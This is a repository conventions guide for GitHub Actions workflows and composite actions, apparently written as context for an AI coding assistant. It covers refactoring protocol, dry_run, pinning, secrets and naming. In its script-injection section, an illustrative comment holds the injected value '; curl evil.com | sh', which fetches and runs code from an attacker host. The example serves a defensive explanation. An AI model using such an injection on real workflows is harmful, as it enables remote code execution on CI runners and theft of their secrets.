# GitHub Actions — Full Rules & Conventions

Complete reference for this repository. Use `/workflow` or `/composite` for focused context.
For refactoring existing files, use `/refactor`.

---

## Modifying an existing workflow or composite?

Apply the refactoring protocol below **before making any change** to an existing file.

Never apply changes directly. Always produce a plan, wait for explicit user confirmation, then apply one step at a time.

### Protocol summary

**Step 1 — Analyze the current state**

Read the target file completely and produce a structured summary:

```
Current state of <file>:
- Purpose        : what the workflow/composite does
- Inputs         : list all current inputs and their defaults
- Outputs        : list all current outputs
- Jobs/Steps     : list jobs (workflow) or steps (composite)
- Callers        : note any known repos or workflows that reference this
- dry_run        : present / absent
```

**Step 2 — Produce the refactoring plan**

Present the plan as a numbered step list. Each step must include:

```
Step N — [Label]
  Change : <what will be modified>
  Reason : <why>
  Impact : additive | behavioral | breaking
  Safe   : yes | no — <explanation>
```

**Step 3 — Flag attention points**

- Input/output renamed, removed, or type-changed → **breaking**
- New default that differs from old implicit behavior → **breaking**
- Step order change affecting downstream outputs → **attention**
- New required secret → **breaking for callers**
- No `dry_run` and change applies state → propose adding `dry_run: false` input

**Step 4 — Show breaking changes with migration guide**

```
⚠️ Breaking change in Step N

Before:
  with:
    old_input: value

After:
  with:
    new_input: value

Migration: replace `old_input` with `new_input`.
```

**Step 5 — Propose test examples**

For every behavioral change, provide a concrete test scenario using `dry_run: true` on `@develop`.

**Step 6 — Confirm before applying**

Ask the user to confirm each step explicitly. Do not apply any change until confirmed:

```
Ready to apply?

  [ ] Step 1 — <label>
  [ ] Step 2 — <label>

Reply with step numbers, "all", or "cancel".
```

**Step 7 — Apply one step at a time**

Show a diff summary after each step. Wait for confirmation before proceeding to independent steps.

**Step 8 — Update documentation**

Update `docs/<workflow-name>.md` or composite `README.md` to reflect all confirmed changes.

### What must never change without explicit confirmation

- Default values of existing inputs
- Names of existing inputs or outputs
- Behavior when optional inputs are omitted
- Step ordering when downstream steps depend on earlier outputs
- Required secrets — adding one is always a breaking change for callers

---

## Before you create anything

These checks apply to **both reusable workflows and composite actions**.

**Step 1 — Check if it already exists in this repo**

- Workflows: search `.github/workflows/`
- Composites: search `src/`

If something already covers the same capability:

- Summarize what the existing implementation does (jobs/steps, inputs, secrets)
- Identify the gap between the existing behavior and the new requirement
- Propose an **adaptation plan** (add an input, add a job, extend steps) instead of creating a new file

**Step 2 — Check the GitHub Actions Marketplace first**

Before writing custom steps from scratch, search the [Marketplace](https://github.com/marketplace?type=actions):

- Prefer a well-maintained marketplace action over custom shell scripting for non-trivial logic
- If the action needs wrapping, create a composite in `src/` — don't inline complex shell directly in a workflow
- Pin to a specific tag or SHA — never `@main` or `@master`
- Document in the README or `docs/` why that action was chosen

Only implement from scratch when no suitable action exists or when existing ones don't meet security or customization requirements.

---

# Reusable Workflows — Rules & Conventions

Use these rules whenever creating or editing a reusable workflow in `.github/workflows/`.

## Architecture model

```
Caller repository workflow         ← minimal entrypoint: triggers + secrets only
         ↓
Reusable workflow                  ← orchestrates jobs, runners, secrets
(.github/workflows/*.yml)
         ↓
Composite action                   ← encapsulates reusable steps
(src/<capability>/<name>/action.yml)
```

**Rules:**
- Caller workflows must contain only triggers and job references — no business logic
- Reusable workflows must orchestrate jobs and route secrets
- Composite actions must encapsulate steps for a single responsibility

**Example: Go CI pipeline**

```
caller: .github/workflows/ci.yml  (on: push)
    ↓
reusable: go-ci.yml
    ↓ job: ci
        → src/setup/setup-go      (install Go, restore cache)
        → src/build/build-go      (compile, vet)
        → src/test/test-go        (run tests, upload coverage)
        → src/build/docker-build  (build and push image)
```

## When to use each

| Need | Use |
|---|---|
| Standardize a full CI/CD pipeline across repos | Reusable workflow |
| Reuse a group of steps inside a job | Composite action |
| Share setup / build / lint / test logic | Composite action |
| Manage multiple jobs or runners | Reusable workflow only |
| Route secrets to jobs | Reusable workflow only |

## self-* workflows (entrypoints for this repo)

Files prefixed with `self-` are **thin entrypoints** for this repository's own automation — not reusable workflows.

- **Must NOT have `workflow_call`** — not offered to external callers
- **`dry_run` is not required** — omit it unless the workflow performs destructive operations
- **When `dry_run` is present**, it must be: `type: boolean`, `required: false`, `default: true` for destructive ops (delete, purge) or `default: false` for non-destructive ops (sync, notify)
- Must call the corresponding reusable workflow via local path (`./.github/workflows/<name>.yml`)
- Triggers are repo-specific: `push`, `schedule`, `pull_request`, `workflow_dispatch`
- Must not contain business logic

```yaml
# ✅ Correct self-* structure
name: Self — Labels Sync
on:
  push:
    branches: [main]
    paths: [".github/labels.yml"]
  workflow_dispatch:
jobs:
  sync:
    uses: ./.github/workflows/labels-sync.yml
    secrets: inherit
```

---

## Runner

All jobs in reusable workflows must use `blacksmith-4vcpu-ubuntu-2404` as the runner:

```yaml
jobs:
  build:
    runs-on: blacksmith-4vcpu-ubuntu-2404   # ✅ required runner
    # ...

  deploy:
    runs-on: blacksmith-4vcpu-ubuntu-2404   # ✅ required runner
    # ...
```

```yaml
# ❌ Never use other runners
runs-on: ubuntu-latest
runs-on: ubuntu-22.04
runs-on: self-hosted
```

## Workflow structure

Every reusable workflow must:
- support `workflow_call` (for external callers)
- **must NOT have `workflow_dispatch`** — manual testing belongs in `self-*` entrypoints (see [script injection risk](#script-injection--workflow_dispatch))
- expose explicit `inputs` — never rely on implicit context
- **always include a `dry_run` input** (`type: boolean`, `default: false`)

```yaml
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      dry_run:
        description: Preview changes without applying them
        required: false
        type: boolean
        default: false
    secrets:
      DEPLOY_TOKEN:
        required: true
```

## Step section titles

When a job or composite has more than one logical group of steps, separate each group with a titled section comment:

```yaml
      # ----------------- Security Scans -----------------
      - name: Trivy Secret Scan
        ...

      # ----------------- Docker Scout Analysis -----------------
      - name: Docker Scout
        ...

      # ----------------- PR Comment with Security Findings -----------------
      - name: Post Results to PR
        ...
```

**Rules:**
- Format: `# ----------------- Title -----------------` (exact spacing, dashes on both sides)
- Add when there are 2+ logical groups of steps in the same job or composite
- Title must be short and action-oriented (e.g. "Build & Push", "Security Scans", "Notifications")
- Place the comment immediately before the first step of the group — no blank line between comment and step
- Single-group jobs with 2–3 tightly related steps do not need a title

## Configurability — three-layer defaults and overrides

Composites, reusable workflows, and callers each have a responsibility in the configurability chain. Follow this model to keep things flexible without requiring callers to know composite internals.

**Composite layer** — always define sensible defaults, never `required: true` for feature flags:

```yaml
inputs:
  enable-recommendations:
    description: Include Docker Scout recommendations in the PR comment
    required: false
    default: "true"       # ✅ composite works standalone with no config
```

**Reusable workflow layer** — expose a matching input for every optional composite feature; pass it down explicitly:

```yaml
on:
  workflow_call:
    inputs:
      enable_docker_scout:
        description: Run Docker Scout vulnerability scan
        required: false
        type: boolean
        default: true
      enable_docker_scout_recommendations:
        required: false
        type: boolean
        default: true

jobs:
  scan:
    steps:
      - name: Docker Scout
        if: inputs.enable_docker_scout            # step-level gate — skip entire composite when disabled
        uses: LerianStudio/github-actions-shared-workflows/src/security/docker-scout@v1.2.3
        with:
          enable-recommendations: ${{ inputs.enable_docker_scout_recommendations }}
```

**Rules:**
- Feature toggle `if:` conditions belong in the **reusable workflow** (step or job level), not inside the composite
- Input naming: workflow inputs → `snake_case`, composite inputs → `kebab-case`
- Composite defaults must be safe and sensible standalone; workflow defaults may be more opinionated

```
Caller repo              Reusable workflow           Composite
──────────────────────── ──────────────────────────  ──────────────────────────
enable_docker_scout: false → if: inputs.enable_xxx  → step is never reached
enable_docker_scout_      → enable-recommendations: → ${{ inputs.enable-
  recommendations: false      ${{ inputs.... }}          recommendations }}
```

## dry_run pattern

| Mode | Goal | Log style |
|---|---|---|
| `dry_run: true` | Validate before applying | Verbose — print everything |
| `dry_run: false` | Apply cleanly | Silent — only errors and summaries |

```yaml
# dry_run: true — verbose, annotated, tool debug flags on
- name: Dry run summary
  if: ${{ inputs.dry_run }}
  run: |
    echo "::notice::DRY RUN — no changes will be applied"
    echo "  environment : ${{ inputs.environment }}"
    echo "  target      : ${{ steps.resolve.outputs.target }}"
    echo "  version     : ${{ steps.resolve.outputs.version }}"

- name: Preview (dry run)
  if: ${{ inputs.dry_run }}
  run: helm upgrade --install --dry-run --debug ...

# dry_run: false — clean, no extra echo, output only on failure
- name: Apply
  if: ${{ !inputs.dry_run }}
  run: helm upgrade --install ...
```

**Dry run (`true`):** use `::notice::` annotations, print all resolved values, enable tool-native flags (`--dry-run --debug`, `--check`, `--plan`, `--diff`), never skip silently.

**Real run (`false`):** no extra `echo`, no debug flags, let failures surface via exit codes, one `::notice::` summary on success at most.

## Composite action references (critical)

In reusable workflows (`workflow_call`), `uses: ./path` resolves to the **caller's workspace**, not this repository. This means `./src/...` only works when the caller IS this repo (i.e., `self-*` workflows).

- **Workflows called by external repos** — must use an external ref:
  ```yaml
  uses: LerianStudio/github-actions-shared-workflows/src/notify/discord-release@v1.2.3  # ✅ pinned
  uses: LerianStudio/github-actions-shared-workflows/src/notify/discord-release@develop # ⚠️ testing only
  uses: ./src/notify/discord-release  # ❌ resolves to caller's workspace, will fail
  ```
- **`self-*` workflows (internal only)** — local path for reusable workflow only:
  ```yaml
  uses: ./.github/workflows/labels-sync.yml  # ✅ caller is this repo
  ```

## Secrets management

```yaml
# Caller
jobs:
  deploy:
    uses: LerianStudio/github-actions-shared-workflows/.github/workflows/deploy.yml@v1.2.3
    secrets:
      DOCKER_TOKEN: ${{ secrets.DOCKER_TOKEN }}

# Reusable workflow — declare but never set a value
on:
  workflow_call:
    secrets:
      DOCKER_TOKEN:
        required: true
```

## Naming conventions

```
✅  go-ci.yml   build-node.yml   labels-sync.yml   helm-deploy.yml
❌  workflow.yml   pipeline.yml   ci.yml   action.yml
```

Always use `.yml` extension — never `.yaml`:

```
✅  go-ci.yml   action.yml   labels.yml   dependabot.yml
❌  go-ci.yaml  action.yaml  labels.yaml
```

## Documentation naming

The doc file in `docs/` must have the **exact same name** as the workflow file, with `.md` extension, and must start with the Lerian branding header:

```markdown
<table border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td><img src="https://github.com/LerianStudio.png" width="72" alt="Lerian" /></td>
    <td><h1>workflow-name</h1></td>
  </tr>
</table>
```

```
.github/workflows/go-ci.yml        → docs/go-ci.md          ✅
.github/workflows/go-ci.yml        → docs/go-ci-workflow.md  ❌
.github/workflows/labels-sync.yml  → docs/labels-sync.md    ✅
```

Every new reusable workflow must have a corresponding `docs/<workflow-name>.md`.

### Usage example ref policy

Examples in `docs/` and `README.md` must never use `@main`. Use the correct ref for each context:

```yaml
# ✅ Testing — point to develop or feature branch
uses: LerianStudio/github-actions-shared-workflows/.github/workflows/go-ci.yml@develop
uses: LerianStudio/github-actions-shared-workflows/.github/workflows/go-ci.yml@feat/my-branch

# ✅ Production — always a pinned stable version
uses: LerianStudio/github-actions-shared-workflows/.github/workflows/go-ci.yml@v1.2.3

# ❌ Never in examples
uses: LerianStudio/github-actions-shared-workflows/.github/workflows/go-ci.yml@main
```

## Anti-patterns

```yaml
# ❌ Monolithic composite — does setup + build + test + deploy in one action
src/go-ci/action.yml

# ❌ Multi-language composite — couples runtimes
src/build/build-all/action.yml

# ❌ Orchestration inside composite
runs:
  using: composite
  jobs:          # invalid — composites have steps, not jobs
    build: ...

# ❌ Local path for composite in a workflow called by external repos
uses: ./src/setup-go  # resolves to caller's workspace, not this repo

# ❌ Mutable ref on third-party actions
uses: some-action/tool@main
```

## Security rules

- Pin all third-party actions to a specific tag or SHA — Dependabot keeps them updated
- Never use `@main` or `@master` for third-party actions
- Never interpolate untrusted user input directly into `run:` commands
- Never print secrets via `echo`, env dumps, or step summaries
- Complex conditional logic belongs in the workflow, not in composites

### Script injection & `workflow_dispatch`

`workflow_dispatch` inputs are **user-controlled free-text** — they are a script injection vector when interpolated into `run:` blocks, `github-script`, or any expression context.

**Why reusable workflows must NOT have `workflow_dispatch`:**

1. **Attack surface** — any repo collaborator can trigger the workflow with arbitrary input values. If those values reach a `run:` step via `${{ inputs.xxx }}`, an attacker can inject shell commands.
2. **Redundancy** — `self-*` entrypoints already provide `workflow_dispatch` with controlled, repo-specific defaults. Adding it to the reusable workflow duplicates the trigger surface without added value.
3. **Input type mismatch** — `workflow_dispatch` inputs are always strings (even booleans become `"true"`/`"false"`), causing subtle type bugs when the same input is `type: boolean` under `workflow_call`.

```yaml
# ❌ Reusable workflow with workflow_dispatch — injection risk + type mismatch
on:
  workflow_call:
    inputs:
      environment:
        type: string
  workflow_dispatch:
    inputs:
      environment:        # string — attacker can inject: "; curl evil.com | sh"
        type: string

# ✅ Reusable workflow — workflow_call only
on:
  workflow_call:
    inputs:
      environment:
        type: string

# ✅ self-* entrypoint provides the manual trigger with safe defaults
name: Self — Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice           # choice, not free-text — no injection
        options: [staging, production]
jobs:
  deploy:
    uses: ./.github/workflows/deploy.yml
    with:
      environment: ${{ inputs.environment }}
    secrets: inherit
```

**When `workflow_dispatch` is allowed on a reusable workflow:**

Only when **all** of the following are true:
- The workflow is **not consumed by external repos** (internal-only)
- Every `workflow_dispatch` input uses `type: choice` or `type: boolean` — **never free-text `type: string`**
- No input value is interpolated into `run:` blocks — only into `with:` parameters of trusted actions
- The decision is documented with a `# Security: workflow_dispatch approved — <reason>` comment

---

# Composite Actions — Rules & Conventions

Use these rules whenever creating or editing a composite action in `src/`.

## Directory layout

Composite actions are grouped by capability inside `src/`:

```
src/
├── setup/       ← language runtime setup (Go, Node, etc.)
├── build/       ← build and artifact generation
├── test/        ← test execution and coverage
├── deploy/      ← deployment and release steps
└── config/      ← repository configuration management
```

Each composite lives in `src/<capability>/<name>/` with exactly two files:

```
src/config/labels-sync/
├── action.yml   ← required
└── README.md    ← required
```

## action.yml structure

```yaml
name: Human-readable name
description: One-line description.

inputs:
  github-token:
    description: GitHub token with required permissions
    required: true
  some-option:
    description: What this option controls
    required: false
    default: "default-value"

runs:
  using: composite
  steps:
    - name: Checkout
      uses: actions/checkout@v4
    - name: Do the work
      uses: some-owner/some-action@v1
      with:
        token: ${{ inputs.github-token }}
        option: ${{ inputs.some-option }}
```

## Design rules

- **5–15 steps maximum** — split if larger
- **Single responsibility** — one composite, one capability
- Must not define jobs or call other workflows
- Must not contain pipeline control logic
- Never combine multiple language runtimes in the same composite

## Language-specific vs cross-language

Specialize by runtime when toolchains differ:

```
src/setup/setup-go/     ← Go toolchain, GOPATH, module cache
src/setup/setup-node/   ← Node.js, npm/yarn/pnpm, cache
src/build/build-go/     ← go build, cross-compilation
src/test/test-go/       ← go test, coverage upload
```

Cross-language composites stay language-agnostic:

```
src/build/docker-build/   ← any image
src/deploy/helm-deploy/   ← any chart
src/config/labels-sync/   ← any repo
```

## README.md requirements

1. Logo header — HTML table layout (logo left, `h1` title right)
2. Inputs table — `Input | Description | Required | Default`
3. Usage as composite step (full YAML)
4. Usage as reusable workflow (full YAML with `secrets: inherit`)
5. Required permissions block

## After creating a new composite

- Update root `README.md` if the composite is meant to be used by external callers

### Labels checklist

Check `.github/labels.yml` for a label matching the composite's capability group. If it doesn't exist, add it:

```yaml
- name: <capability>           # e.g. "infrastructure", "notifications"
  color: "0075ca"              # pick a distinct hex color
  description: Changes to <capability> composite actions
```

After adding, run the `Sync Labels` workflow (`workflow_dispatch`) to create it in the repository.

### Dependabot checklist

For every third-party action used in the new composite (`uses: owner/action@vX`), check `.github/dependabot.yml`:

- If `owner/*` already matches an existing group → no change needed
- If not → add to the most appropriate group, or create a new one:

```yaml
new-tool-category:
  patterns:
    - "owner/new-action"
  update-types:
    - "minor"
    - "patch"
```

Never add `LerianStudio/*` actions to dependabot — pinned to `@main` intentionally.

## Reserved names — never use as secret, input, or env var

Never use GitHub's reserved prefixes for custom secrets, inputs, or env vars — they conflict with runtime variables and break jobs silently:

```yaml
# ❌ Reserved — GITHUB_TOKEN is injected automatically, cannot be a named secret
on:
  workflow_call:
    secrets:
      GITHUB_TOKEN:   # breaks callers
        required: true

# ✅ Use a distinct name
on:
  workflow_call:
    secrets:
      MANAGE_TOKEN:
        required: false
```

Reserved prefixes (workflows and composites): `GITHUB_*`, `ACTIONS_*`, `RUNNER_*`.
